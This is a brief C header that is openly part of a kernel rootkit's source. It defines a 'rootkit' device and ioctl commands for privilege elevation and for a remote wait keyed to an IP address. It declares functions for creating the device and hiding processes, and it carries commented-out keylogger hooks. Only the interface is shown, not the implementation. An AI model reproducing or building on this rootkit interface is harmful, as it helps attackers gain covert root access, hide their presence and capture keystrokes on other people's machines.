#ifndef INTERFACE_H
#define INTERFACE_H

#include <sys/ioccom.h>
#include <netinet/in.h>

#define rootkit_DEV_NAME "rootkit"

/* ioctl definitions for privilege elevation and remote wait */
#define rootkit_ELEVATE            _IO('r', 0x01)
#define rootkit_IOCTL_ELEVATE      rootkit_ELEVATE

#define rootkit_WAIT_REMOTE        _IOW('r', 0x02, struct in_addr)
#define rootkit_IOCTL_WAIT_REMOTE  rootkit_WAIT_REMOTE

int make_rootkit_dev(void);
void destroy_rootkit_dev(void);
void hide_process_syscall(void);
// void init_keylogger(void);
// void cleanup_keylogger(void);

#endif

